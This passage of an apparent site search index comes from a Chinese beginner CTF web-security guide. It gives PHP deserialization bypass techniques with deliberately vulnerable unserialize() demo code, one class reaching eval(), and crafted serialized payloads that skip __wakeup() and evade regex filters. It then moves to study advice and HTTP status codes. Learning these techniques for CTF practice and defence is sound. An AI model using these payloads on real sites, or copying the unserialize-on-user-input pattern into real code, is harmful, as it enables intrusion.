if(!isset($this-&gt;wakeup)||!$this-&gt;wakeup){\n            echo \"OK\";\n        }\n    }\n    public function __wakeup(){\n        $this-&gt;wakeup=True;\n    }\n}\n$a = $_GET['data'];\nunserialize($a);\n}\n</code></pre> <p>\u5728\u53cd\u5e8f\u5217\u5316\u7684\u65f6\u5019\u4f1a\u89e6\u53d1<code>__wakeup()</code>\u8d4b\u503c<code>$this-&gt;wakeup=True;</code>\u5bfc\u81f4<code>if(!isset($this-&gt;wakeup)||!$this-&gt;wakeup)</code>\u5224\u65ad\u4e0d\u6210\u7acb</p> <p>\u8fd9\u91cc\u5c31\u662f\u7ed5\u8fc7wakeup\uff0c\u7528\u5f15\u7528\u8d4b\u503c\u6765bypass</p> <pre><code>&lt;?php\n\nclass demo{\n    public $key;\n\n    public function __destruct()\n    {\n    }\n\n}\n\n$a = new demo();\n$a-&gt;key=&amp;$a-&gt;wakeup;\necho serialize($a); \n\n/* \nO:4:\"demo\":2:{s:3:\"key\";N;s:6:\"wakeup\";R:2;}\n</code></pre> <p>\u53cd\u5e8f\u5217\u5316\u7684\u65f6\u5019<code>__wakeup()</code>\u8d4b\u503c<code>$wakeup</code>\u4e3atrue\uff0ckey\u7684\u5f15\u7528\u5bfc\u81f4wakeup\u53c8\u88ab\u8d4b\u503c\u4e3a\u7a7a\uff0c\u4ece\u800c\u7ed5\u8fc7if</p>"},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%87/#fast-destruct","title":"Fast-Destruct","text":"<p>\u6b63\u5e38\u53cd\u5e8f\u5217\u5316\u6d41\u7a0b</p> <p>PHP \u53cd\u5e8f\u5217\u5316\u65f6\u901a\u5e38\u7684\u6267\u884c\u987a\u5e8f\uff1a</p> <ol> <li>\u521b\u5efa\u5bf9\u8c61\u5b9e\u4f8b</li> <li>\u6062\u590d\u5bf9\u8c61\u5c5e\u6027</li> <li>\u8c03\u7528 <code>__wakeup()</code> \u65b9\u6cd5\uff08\u5982\u679c\u5b58\u5728\uff09</li> <li>\u811a\u672c\u7ed3\u675f\u65f6\u8c03\u7528 <code>__destruct()</code> \u65b9\u6cd5</li> </ol>"},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%87/#_13","title":"\u51cf\u5c11\u95ed\u5408\u5927\u62ec\u53f7 <code>}</code>","text":"<pre><code>// \u539f\u59cb\u5e8f\u5217\u5316\u6570\u636e\nO:4:\"demo\":4:{...}}\n\n// \u653b\u51fbpayload\uff08\u51cf\u5c11\u4e00\u4e2a }\uff09\nO:4:\"demo\":4:{...}\n</code></pre> <p>\u4f7f PHP \u89e3\u6790\u5668\u8ba4\u4e3a\u5e8f\u5217\u5316\u6570\u636e\u63d0\u524d\u7ed3\u675f</p> <p>\u89e6\u53d1\u5bf9\u8c61\u9500\u6bc1\u6d41\u7a0b</p>"},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%87/#_14","title":"\u5728\u5f15\u7528\u540e\u6dfb\u52a0\u65e0\u6548\u6570\u636e","text":"<pre><code>// \u539f\u59cb\u5f15\u7528\ns:4:\"hint\";r:10;}\n\n// \u653b\u51fbpayload\uff08\u5728\u5f15\u7528\u540e\u6dfb\u52a0 1\uff09\ns:4:\"hint\";r:10;1}\n</code></pre> <p>\u7834\u574f\u5e8f\u5217\u5316\u7ed3\u6784\u4f46\u4fdd\u6301\u8bed\u6cd5\u6709\u6548</p> <p>\u5bfc\u81f4\u89e3\u6790\u5668\u5f02\u5e38\u5904\u7406</p> <p>\u6b63\u5e38\u60c5\u51b5\u4e0b\uff1a<code>__wakeup()</code> \u2192 \u5176\u4ed6\u4ee3\u7801 \u2192 <code>__destruct()</code></p> <p>\u653b\u51fb\u60c5\u51b5\u4e0b\uff1a\u76f4\u63a5\u89e6\u53d1 <code>__destruct()</code></p>"},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%87/#9618","title":"9618","text":"<p>php issue#9618</p> <p>\u7248\u672c\uff1a7.4.x -7.4.30\uff1b8.0.x</p> <pre><code>&lt;?php\n\nclass A\n{\n    public $info;\n    private $end = \"1\";\n\n    public function __destruct()\n    {\n        $this-&gt;info-&gt;func();\n    }\n}\n\nclass B\n{\n    public $end;\n\n    public function __wakeup()\n    {\n        $this-&gt;end = \"exit();\";\n        echo '__wakeup';\n    }\n\n    public function __call($method, $args)\n    {\n        eval('echo \"aaaa\";' . $this-&gt;end . 'echo \"bbb\"');\n    }\n}\n\nunserialize($_POST['data']);\n</code></pre> <p><code>private $end = \"1\";</code></p> <p><code>[POST]data=O:1:\"A\":2:{s:4:\"info\";O:1:\"B\":1:{s:3:\"end\";N;}s:6:\"Aend\";s:1:\"1\";}</code></p> <p>\u8fd9\u91cc\u7684<code>s:6:\"Aend\"</code>\u5b9e\u9645\u4e0a\u5c31\u662f<code>Aend</code>\u8fd9\u56db\u4e2a\u5b57\u7b26\uff0c\u4e0d\u52a0<code>\\0\u7c7b\u540d\\0</code>\uff0c\u4ece\u800c\u7834\u574f\u53cd\u5e8f\u5217\u5316\u7684\u7ed3\u6784</p> <p>\u4ece\u800c\u7ed5\u8fc7wakeup</p>"},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%87/#16","title":"16\u8fdb\u5236\u7ed5\u8fc7\u5b57\u7b26\u8fc7\u6ee4","text":"<pre><code>O:4:\"test\":2:{s:4:\"%00*%00a\";s:3:\"abc\";s:7:\"%00test%00b\";s:3:\"def\";}\n\u53ef\u4ee5\u5199\u6210\nO:4:\"test\":2:{S:4:\"\\00*\\00\\61\";s:3:\"abc\";s:7:\"%00test%00b\";s:3:\"def\";}\n\u8868\u793a\u5b57\u7b26\u7c7b\u578b\u7684s\u5927\u5199\u65f6\uff0c\u4f1a\u88ab\u5f53\u621016\u8fdb\u5236\u89e3\u6790\u3002\n</code></pre>"},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%87/#_15","title":"\u7ed5\u8fc7\u90e8\u5206\u6b63\u5219","text":"<p><code>preg_match('/^O:\\d+/')</code>\u5339\u914d\u5e8f\u5217\u5316\u5b57\u7b26\u4e32\u662f\u5426\u662f\u5bf9\u8c61\u5b57\u7b26\u4e32\u5f00\u5934</p>"},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%87/#_16","title":"\u5229\u7528\u52a0\u53f7\u7ed5\u8fc7","text":"<p>\u6ce8\u610f\u5728url\u91cc\u4f20\u53c2\u65f6+\u8981\u7f16\u7801\u4e3a%2B</p> <pre><code>$a = 'O:4:\"test\":1:{s:1:\"a\";s:3:\"abc\";}'; //+\u53f7\u7ed5\u8fc7 \n$b = str_replace('O:4','O:+4', $a);\n// O:+4:\"test\":1:{s:1:\"a\";s:3:\"abc\";}'\n</code></pre>"},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%87/#serialize-array-a","title":"serialize( array( a) );","text":"<p>a\u4e3a\u8981\u53cd\u5e8f\u5217\u5316\u7684\u5bf9\u8c61\uff08\u5e8f\u5217\u5316\u7ed3\u679c\u5f00\u5934\u662fa\uff0c\u4e0d\u5f71\u54cd\u4f5c\u4e3a\u6570\u7ec4\u5143\u7d20\u7684$a\u7684\u6790\u6784\uff09</p> <pre><code>// \u4fee\u6539serialize($a);\u4e3a\nserialize(array($a));\nunserialize('a:1:{i:0;O:4:\"test\":1:{s:1:\"a\";s:3:\"abc\";}}');\n</code></pre> <p>\u9664\u6b64\u4e4b\u5916\uff0c\u8fd8\u53ef\u4ee5</p> <p><code>$oa=new ArrayObject($a);</code>(php 7.3.4)</p> <p>\u4f1a\u751f\u6210\u4ee5C\u5f00\u5934\u7684\u5e8f\u5217\u5316\u6570\u636e\uff0c\u540c\u65f6\u6b63\u5e38\u53cd\u5e8f\u5217\u5316\u4e5f\u53ef\u4ee5\u7ed5\u8fc7<code>__wakeup()</code></p> <pre><code>ArrayObject::unserialize\nArrayIterator::unserialize\nRecursiveArrayIterator::unserialize\nSplObjectStorage::unserialize\n</code></pre> <p>\u53c2\u8003\uff1b\u53c2\u8003</p>"},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-%E5%9F%BA%E7%A1%80%E7%AF%87/","title":"\u5199\u5728\u524d\u9762","text":"<p> \u7ea6 2850 \u4e2a\u5b57  56 \u884c\u4ee3\u7801  10 \u5f20\u56fe\u7247  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 10 \u5206\u949f</p> <p>\u672c\u4eba\u521a\u5165\u95e8\u65f6\u7684\u57fa\u7840\u6bd4\u5c0f\u767d\u8fd8\u5c0f\u767d\uff0c\u5b66\u4e60\u8def\u4e0a\u901b\u4e86\u4e0d\u5c11\u535a\u5ba2 \u5404\u4e2a\u5e73\u53f0\u4e0a\u7684\u535a\u5ba2\u65e0\u975e\u6284\u6765\u6284\u53bb\uff0c\u6211\u628a\u6211\u8ba4\u4e3a\u6709\u7528\u7684\u5185\u5bb9\u6574\u5408\u4e86\u4e00\u4e0b \u5927\u81ea\u7136\u7684\u642c\u8fd0\u5de5\u7f62\u4e86</p>"},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-%E5%9F%BA%E7%A1%80%E7%AF%87/#what-is-web","title":"What is Web","text":"<p>what is web\u7684\u5185\u5bb9\u501f\u9274\u81eaLandasika\u5e08\u5085\u5199\u7684\u6587\u7ae0\uff0c\u6709\u5220\u6539</p>"},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-%E5%9F%BA%E7%A1%80%E7%AF%87/#web","title":"\u4e00\u3001WEB\u5b89\u5168\u662f\u4ec0\u4e48","text":"<p>web\u4e5f\u5c31\u662f\u4fd7\u79f0\u7684web\u5b89\u5168\uff0c\u4e5f\u5c31\u662f\u5927\u5bb6\u6253\u5f00\u6d4f\u89c8\u5668\u7684\u90a3\u4e00\u523b\u3002\u5c31\u5f00\u59cb\u548cweb\u6253\u4ea4\u9053\u4e86\u3002\u6211\u4eec\u662f\u5b66\u7f51\u7edc\u5b89\u5168\u7684\uff0cweb\u5b89\u5168\u662f\u7f51\u7edc\u4e2d\u6700\u7ecf\u5178\u7684\u5e94\u7528\u4e4b\u4e00\u3002 Web\u5b89\u5168\u5c31\u662f\u8981\u63d0\u4f9b\u8bc1\u636e\u8868\u660e\uff0c\u5728\u9762\u5bf9\u654c\u610f\u548c\u6076\u610f\u8f93\u5165\u7684\u65f6\u5019\uff0cweb\u7cfb\u7edf\u5e94\u7528\u4ecd\u7136\u80fd\u591f\u5145\u5206\u5730\u6ee1\u8db3\u5b83\u7684\u9700\u6c42 2005\u5e7406\u6708\uff0cCardSystems\uff0c\u9ed1\u5ba2\u6076\u610f\u4fb5\u5165\u4e86\u5b83\u7684\u7535\u8111\u7cfb\u7edf\uff0c\u7a83\u53d6\u4e864000\u4e07\u5f20\u4fe1\u7528\u5361\u7684\u8d44\u6599\u3002 2011\u5e7412\u6708\uff0c\u56fd\u5185\u6700\u5927\u7684\u5f00\u53d1\u8005\u793e\u533aCSDN\u88ab\u9ed1\u5ba2\u5728\u4e92\u8054\u7f51\u4e0a\u516c\u5e03\u4e86600\u4e07\u6ce8\u518c\u7528\u6237\u7684\u6570\u636e\uff1b\u9ed1\u5ba2\u968f\u540e\u9646\u7eed\u516c\u5e03\u4e86\u7f51\u6613\u3001\u4eba\u4eba\u3001\u5929\u6daf\u3001\u732b\u6251\u7b49\u591a\u5bb6\u5927\u578b\u7f51\u7ad9\u7684\u6570\u636e\u4fe1\u606f\u3002</p>"},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-%E5%9F%BA%E7%A1%80%E7%AF%87/#web_1","title":"\u4e8c\u3001\u5982\u4f55\u5165\u95e8WEB\u5b89\u5168","text":"<p>\u53ef\u4ee5\u53c2\u8003\u8fd9\u7bc7\u6587\u7ae0\uff1ahttps://zhuanlan.zhihu.com/p/409570216 \u5e38\u89c1Web\u5b89\u5168\u6f0f\u6d1e\u5927\u81f4\u53ef\u4ee5\u5206\u4e3a\uff1a\u4fe1\u606f\u6cc4\u9732\u3001\u5f31\u53e3\u4ee4\u7206\u7834\u3001\u547d\u4ee4\u6267\u884c\u3001\u6587\u4ef6\u5305\u542b\u3001php\u7279\u6027\u3001\u6587\u4ef6\u4e0a\u4f20\u3001sql\u6ce8\u5165\u3001\u53cd\u5e8f\u5217\u5316\u3001\u4ee3\u7801\u5ba1\u8ba1\u3001XSS\u3001jwt\u3001SSRF\u3001CSRF \u5148\u6df1\u5165\u7406\u89e3\u8fd9\u4e9b\u6f0f\u6d1e\u80cc\u540e\u7684\u539f\u7406\u548c\u77e5\u8bc6\uff0c\u7136\u540e\u8fd0\u7528\u4e8e\u5b9e\u6218\u5316\uff08CTF\u6a21\u62df\uff09 \u63a8\u8350\u65b0\u624b\u5237\u9898\u5e73\u53f0\uff1actf.show\uff0chttps://buuoj.cn/</p> <p>\u6709\u4e9b\u7ae5\u978b\u4f1a\u95ee\uff0c\u4ece\u54ea\u91cc\u5f00\u59cb\u5462\uff1f \u5927\u5bb6\u83ab\u614c\uff0c\u5148\u4ece\u4e00\u4e2a\u642d\u5efa\u4e00\u4e2a\u7f51\u9875\uff0c\u7406\u89e3\u8fd0\u884c\u673a\u7406\u5f00\u59cb\u5427\uff01 \u672c\u5730\u670d\u52a1\u5668\u7684\u642d\u5efa\uff1a\u5229\u7528phpstudy\u642d\u5efa\u4e00\u4e2awamp</p> <ul> <li>\u53c2\u8003\u94fe\u63a5\uff1ahttps://blog.csdn.net/weixin_43837883/article/details/114021104</li> </ul> <p>\u6700\u7ec8\u5b9e\u73b0\uff0c\u5176\u5b9e\u5e76\u4e0d\u9700\u8981\u4f60\u5b9e\u73b0\u5b89\u88c5\u4e00\u4e2awordpress\u535a\u5ba2\u3002\u5728\u7f51\u9875\u6240\u5728\u7684\u6839\u76ee\u5f55\u627e\u5230index.html\u5373\u53ef\u3002 \u4e4b\u540e\u53ef\u4ee5\u5b66\u4e60\u4e00\u4e0bweb\u524d\u7aefhtml\u7684\u8bed\u8a00\u6784\u9020 \u4ee5\u53ca\u4e86\u89e3js\u662f\u4ec0\u4e48\uff08\u5728\u5b66\u4e60XSS\u6f0f\u6d1e\u7684\u65f6\u5019\u4e86\u89e3\u5373\u53ef\uff09 \u7136\u540e\u5b66\u4e60\u4e00\u4e0bphp\u7684\u8bed\u8a00 \uff08\u4e0d\u9700\u8981\u90a3\u4e48\u7cbe\u901a\uff0c\u53ea\u9700\u8981\u77e5\u9053\u6709\u4ec0\u4e48\u51fa\u9898\u7684\u70b9\uff0c\u80fd\u770b\u61c2\u4ee3\u7801\u5c31\u597d\uff09 \u7136\u540e\u5c31\u53ef\u4ee5\u5f00\u59cb\u5b66\u4e60\u4e00\u4e9b\u6f0f\u6d1e\uff0c\u53ef\u4ee5\u4ece\u6700\u7b80\u5355\u7684php\u7279\u6027\u5f00\u59cb\u3002 \u5728\u672c\u7bc7\u4e2d\uff0c\u6211\u628aphp\u7684\u4e00\u4e9b\u7279\u6027\u653e\u5728\u4e86\u524d\u7f6e\u77e5\u8bc6\u7684\u4f4d\u7f6e\uff0c\u5927\u5bb6\u53ef\u4ee5\u968f\u5b66\u968f\u770b</p>"},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-%E5%9F%BA%E7%A1%80%E7%AF%87/#_2","title":"\u4e09\u3001\u4e66\u7c4d\u63a8\u8350","text":"<ul> <li>\u5b66web\u5165\u95e8\u63a8\u8350\u662f\u300aweb\u5b89\u5168\u6df1\u5ea6\u5256\u6790\u300b\u867d\u7136\u5185\u5bb9\u6709\u4e9b\u8001\uff0c\u4f46\u662f\u5bf9\u65b0\u624b\u5165\u95e8\u5f88\u53cb\u597d\u3002</li> <li>\u300aweb\u524d\u7aef\u9ed1\u5ba2\u6280\u672f\u63ed\u79d8\u300b\u504f\u5411\u4e8e\u524d\u7aef\u9ed1\u5ba2\u77e5\u8bc6\uff0c\u90fd\u662f\u4e9b\u7406\u8bba\u8bdd\u7684\u4e1c\u897f</li> <li>\u8fd8\u6709\u662f\u5f90\u7131\u7684\u300aweb\u5b89\u5168\u653b\u9632\u300b\u8fd9\u672c\u4e66\u504f\u5411\u4e8eweb\u6e17\u900f\u5b9e\u6218\uff0c\u624b\u628a\u624b\u6559\u4f60\u5982\u4f55\u642d\u5efa\u73af\u5883\u3002\u8fd8\u6709\u914d\u5957\u7684\u6e90\u4ee3\u7801\uff0c\u53ef\u4ee5\u8fb9\u641e\u5b9e\u6218\u6280\u5de7\u8fb9\u73a9\u4ee3\u7801\u5ba1\u8ba1\u3002</li> <li>\u518d\u7136\u540e\u5c31\u662f\u9053\u54e5\u7684\u300a\u767d\u5e3d\u5b50\u8bb2web\u5b89\u5168\u300b\u4e86\uff0c\u840c\u65b0\u8bfb\u8fd9\u4e2a\u53ef\u80fd\u4f1a\u6709\u70b9\u56f0\u96be\uff0c\u4f46\u662f\u8fd9\u672c\u4e66\u4e0d\u53ef\u4e0d\u8bfb\uff0c\u91cc\u9762\u7684\u601d\u60f3\u65b9\u6cd5\u503c\u5f97\u5b66\u4e60\u3002</li> <li>\u4e2d\u540e\u671f\u5c31\u662f\u504f\u5411\u4e8e\u7f16\u7a0b\u548c\u811a\u672c\u4e86\uff0c\u641eweb\u9996\u5148\u5c31\u662f\u8981\u5b66\u597dPHP\uff0c\u7136\u540e\u53ef\u4ee5\u5b66python\uff08CTF\u9898\u76ee\u5f88\u591a\u662f\u8981\u5199\u811a\u672c\u7684\uff09\u5b66\u597d\u7f16\u7a0b\u5e76\u80fd\u5199\u4e00\u4e9b\u7b80\u5355\u7684\u5de5\u5177\u662fweb\u6e17\u900f\u7684\u5206\u6c34\u5cad</li> </ul>"},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-%E5%9F%BA%E7%A1%80%E7%AF%87/#_3","title":"\u65b9\u4fbf\u6211\u4eec\u4f7f\u7528\u7684\u8f6f\u4ef6","text":"<ul> <li>notepad++\uff08\u529b\u8350\uff09</li> <li>Sublime text\uff08\u591a\u7cfb\u7edf\u517c\u5bb9</li> <li>utools</li> <li>Typora</li> </ul>"},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-%E5%9F%BA%E7%A1%80%E7%AF%87/#_4","title":"\u524d\u7f6e\u77e5\u8bc6","text":"<p>\u4e0d\u662f\u770b\u5b8c\u524d\u7f6e\u77e5\u8bc6\u624d\u80fd\u5b66\u4e60\u6f0f\u6d1e\uff0c\u8fd9\u91cc\u4ec5\u4f5c\u6574\u7406\uff0c\u8fb9\u770b\u8fb9\u5b66 \u8fd9\u4efd\u5927\u7eb2\u4f1a\u5e26\u4f60\u8fc7\u4e00\u904d\u5b66\u4e60web\u6240\u9700\u7684\u4e00\u4e9b\u4e3b\u8981\u7684\u57fa\u7840\u77e5\u8bc6\uff0c\u4f46\u662f\u96be\u514d\u6709\u758f\u6f0f\u7684\u5730\u65b9\uff0c\u5927\u5bb6\u5b66\u4e60\u7684\u65f6\u5019\u9047\u5230\u4e0d\u660e\u767d\u7684\u95ee\u9898\u591a\u591a\u767e\u5ea6\uff0c\u767e\u5ea6\u89e3\u51b3\u4e0d\u4e86\u7684\u968f\u65f6\u95ee\u5b66\u957f\u5b66\u59d0\uff0c\u5468\u62a5\u6c42\u8d28\u4e0d\u6c42\u91cf\uff0c\u5b66\u5230\u4e1c\u897f\u624d\u662f\u6700\u91cd\u8981\u7684 \u8865\u5145\uff1a\u5df2\u7ecf\u4ece\u201c\u767e\u5ea6\u65f6\u4ee3\u201d\u8fdb\u5165\u201cai\u65f6\u4ee3\u201d\u4e86\uff0cai\u53ef\u4ee5\u89e3\u51b3\u5927\u591a\u6570\u7684\u95ee\u9898</p>"},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-%E5%9F%BA%E7%A1%80%E7%AF%87/#1http","title":"1.http\u72b6\u6001\u7801","text":"<pre><code> 1\u5f00\u5934\u7684http\u72b6\u6001\u7801\n\u8868\u793a\u4e34\u65f6\u54cd\u5e94\u5e76\u9700\u8981\u8bf7\u6c42\u8005\u7ee7\u7eed\u6267\u884c\u64cd\u4f5c\u7684\u72b6\u6001\u4ee3\u7801\u3002\n\n100   \uff08\u7ee7\u7eed\uff09 \u8bf7\u6c42\u8005\u5e94\u5f53\u7ee7\u7eed\u63d0\u51fa\u8bf7\u6c42\u3002 \u670d\u52a1\u5668\u8fd4\u56de\u6b64\u4ee3\u7801\u8868\u793a\u5df2\u6536\u5230\u8bf7\u6c42\u7684\u7b2c\u4e00\u90e8\u5206\uff0c\u6b63\u5728\u7b49\u5f85\u5176\u4f59\u90e8\u5206\u3002  \n101   \uff08\u5207\u6362\u534f\u8bae\uff09 \u8bf7\u6c42\u8005\u5df2\u8981\u6c42\u670d\u52a1\u5668\u5207\u6362\u534f\u8bae\uff0c\u670d\u52a1\u5668\u5df2\u786e\u8ba4\u5e76\u51c6\u5907\u5207\u6362\u3002\n\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\n2\u5f00\u5934\u7684http\u72b6\u6001\u7801\n\u8868\u793a\u8bf7\u6c42\u6210\u529f\n\n200     \u6210\u529f\u5904\u7406\u4e86\u8bf7\u6c42\uff0c\u4e00\u822c\u60c5\u51b5\u4e0b\u90fd\u662f\u8fd4\u56de\u6b64\u72b6\u6001\u7801\uff1b \n201     \u8bf7\u6c42\u6210\u529f\u5e76\u4e14\u670d\u52a1\u5668\u521b\u5efa\u4e86\u65b0\u7684\u8d44\u6e90\u3002 \n202     \u63a5\u53d7\u8bf7\u6c42\u4f46\u6ca1\u521b\u5efa\u8d44\u6e90\uff1b \n203     \u8fd4\u56de\u53e6\u4e00\u8d44\u6e90\u7684\u8bf7\u6c42\uff1b \n204     \u670d\u52a1\u5668\u6210\u529f\u5904\u7406\u4e86\u8bf7\u6c42\uff0c\u4f46\u6ca1\u6709\u8fd4\u56de\u4efb\u4f55\u5185\u5bb9\uff1b\n205     \u670d\u52a1\u5668\u6210\u529f\u5904\u7406\u4e86\u8bf7\u6c42\uff0c\u4f46\u6ca1\u6709\u8fd4\u56de\u4efb\u4f55\u5185\u5bb9\uff1b\n206     \u5904\u7406\u90e8\u5206\u8bf7\u6c42\uff1b\n\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\n3xx \uff08\u91cd\u5b9a\u5411\uff09 \n\u91cd\u5b9a\u5411\u4ee3\u7801\uff0c\u4e5f\u662f\u5e38\u89c1\u7684\u4ee3\u7801\n\n300   \uff08\u591a\u79cd\u9009\u62e9\uff09  \u9488\u5bf9\u8bf7\u6c42\uff0c\u670d\u52a1\u5668\u53ef\u6267\u884c\u591a\u79cd\u64cd\u4f5c\u3002 \u670d\u52a1\u5668\u53ef\u6839\u636e\u8bf7\u6c42\u8005 (user agent) \u9009\u62e9\u4e00\u9879\u64cd\u4f5c\uff0c\u6216\u63d0\u4f9b\u64cd\u4f5c\u5217\u8868\u4f9b\u8bf7\u6c42\u8005\u9009\u62e9\u3002 \n301   \uff08\u6c38\u4e45\u79fb\u52a8\uff09  \u8bf7\u6c42\u7684\u7f51\u9875\u5df2\u6c38\u4e45\u79fb\u52a8\u5230\u65b0\u4f4d\u7f6e\u3002 \u670d\u52a1\u5668\u8fd4\u56de\u6b64\u54cd\u5e94\uff08\u5bf9 GET \u6216 HEAD \u8bf7\u6c42\u7684\u54cd\u5e94\uff09\u65f6\uff0c\u4f1a\u81ea\u52a8\u5c06\u8bf7\u6c42\u8005\u8f6c\u5230\u65b0\u4f4d\u7f6e\u3002 \n302   \uff08\u4e34\u65f6\u79fb\u52a8\uff09  \u670d\u52a1\u5668\u76ee\u524d\u4ece\u4e0d\u540c\u4f4d\u7f6e\u7684\u7f51\u9875\u54cd\u5e94\u8bf7\u6c42\uff0c\u4f46\u8bf7\u6c42\u8005\u5e94\u7ee7\u7eed\u4f7f\u7528\u539f\u6709\u4f4d\u7f6e\u6765\u8fdb\u884c\u4ee5\u540e\u7684\u8bf7\u6c42\u3002 \n303   \uff08\u67e5\u770b\u5176\u4ed6\u4f4d\u7f6e\uff09 \u8bf7\u6c42\u8005\u5e94\u5f53\u5bf9\u4e0d\u540c\u7684\u4f4d\u7f6e\u4f7f\u7528\u5355\u72ec\u7684 GET \u8bf7\u6c42\u6765\u68c0\u7d22\u54cd\u5e94\u65f6\uff0c\u670d\u52a1\u5668\u8fd4\u56de\u6b64\u4ee3\u7801\u3002 \n304   \uff08\u672a\u4fee\u6539\uff09 \u81ea\u4ece\u4e0a\u6b21\u8bf7\u6c42\u540e\uff0c\u8bf7\u6c42\u7684\u7f51\u9875\u672a\u4fee\u6539\u8fc7\u3002 \u670d\u52a1\u5668\u8fd4\u56de\u6b64\u54cd\u5e94\u65f6\uff0c\u4e0d\u4f1a\u8fd4\u56de\u7f51\u9875\u5185\u5bb9\u3002 \n305   \uff08\u4f7f\u7528\u4ee3\u7406\uff09 \u8bf7\u6c42\u8005\u53ea\u80fd\u4f7f\u7528\u4ee3\u7406\u8bbf\u95ee\u8bf7\u6c42\u7684\u7f51\u9875\u3002 \u5982\u679c\u670d\u52a1\u5668\u8fd4\u56de\u6b64\u54cd\u5e94\uff0c\u8fd8\u8868\u793a\u8bf7\u6c42\u8005\u5e94\u4f7f\u7528\u4ee3\u7406\u3002 \n307   \uff08\u4e34\u65f6\u91cd\u5b9a\u5411\uff09  \u670d\u52a1\u5668\u76ee\u524d\u4ece\u4e0d\u540c\u4f4d\u7f6e\u7684\u7f51\u9875\u54cd\u5e94\u8bf7\u6c42\uff0c\u4f46\u8bf7\u6c42\u8005\u5e94\u7ee7\u7eed\u4f7f\u7528\u539f\u6709\u4f4d\u7f6e\u6765\u8fdb\u884c\u4ee5\u540e\u7684\u8bf7\u6c42\u3002\n\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\n4\u5f00\u5934\u7684http\u72b6\u6001\u7801\u8868\u793a\u8bf7\u6c42\u51fa\u9519\n\n400    